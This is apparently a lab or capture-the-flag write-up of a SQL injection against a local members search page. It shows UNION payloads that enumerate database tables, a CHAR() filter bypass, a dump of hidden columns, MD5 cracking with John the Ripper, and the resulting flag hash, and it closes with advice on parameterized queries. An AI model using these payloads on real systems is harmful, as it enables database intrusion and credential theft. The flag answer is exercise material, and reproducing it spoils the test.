## [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

On the [Members](http://localhost:8080/?page=member) page, there is an input field to search for members by ID. For example, with input `3`, we get:

```
ID: 3
First name: three
Surname : me
```

The first thing to try in any input field is an SQL injection.

Trying `'` as the input, we get the following output: `You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1`. This confirms that we are directly querying the database, without proper input validation.

Since the output has 2 fields, we can try an `UNION` statement such as `42 UNION SELECT table_name, table_type FROM information_schema.tables--`, which shows all the columns from all the tables:

```
ID: 42 UNION SELECT table_name, table_type FROM information_schema.tables--
First name: CHARACTER_SETS
Surname : SYSTEM VIEW

...

ID: 42 UNION SELECT table_name, table_type FROM information_schema.tables--
First name: CLIENT_STATISTICS
Surname : SYSTEM VIEW

...

ID: 42 UNION SELECT table_name, table_type FROM information_schema.tables--
First name: users
Surname : BASE TABLE
```

To get the columns from the table `users` only, we tried the following command: `42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'`, which gives the following output: `You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'users\'' at line 1`. It looks like the server has very basic protection with quotes.

We can bypass it by creating the string with the SQL `CHAR` function: `42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)`. It works and we get the following columns:

```
ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : user_id

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : first_name

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : last_name

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : town

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : country

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : planet

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : Commentaire

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
First name:
Surname : countersign
```

We query all the columns, `Commentaire` and `countersign` seem to be the most interesting. `42 UNION SELECT Commentaire, countersign FROM users--` →

```
ID: 42 UNION SELECT Commentaire, countersign FROM users--
First name: Je pense, donc je suis
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9

ID: 42 UNION SELECT Commentaire, countersign FROM users--
First name: Aamu on iltaa viisaampi.
Surname : 60e9032c586fb422e2c16dee6286cf10

ID: 42 UNION SELECT Commentaire, countersign FROM users--
First name: Dublin is a city of stories and secrets.
Surname : e083b24a01c483437bcf4a9eea7c1b4d

ID: 42 UNION SELECT Commentaire, countersign FROM users--
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

We create a file in the format expected by John the Ripper: `user:5ff9d0165b4f92b14994e5c685cdce28`

and after using john the ripper :

```console
$ john --format=Raw-MD5 sql_injection_members/resources/countersign
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Proceeding with single, rules:Single
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2025-05-24 14:42) 0g/s 49550p/s 49550c/s 49550C/s User1909..User1900
Proceeding with wordlist:/tmp/tmpmu9v917t/password.lst
Enabling duplicate candidate password suppressor
Disabling duplicate candidate password suppressor
FortyTwo         (user)
1g 0:00:00:28 DONE 2/3 (2025-05-24 14:42) 0.03455g/s 15335Kp/s 15335Kc/s 15335KC/s YankeE23..PitchEr1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Now we we lower case to: `fortytwo` and encode it using SHA256 as asked:

```console
$ echo -n fortytwo | sha256sum
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  -
```

To defend against SQL injections, use parameterized queries (also known as prepared statements) everywhere so the ORM, not your code, handles quoting and type-checking. Escaping tricks like replacing quotes only give a false sense of security—an attacker will just switch to `0x`, `CHAR()` or similar tricks.
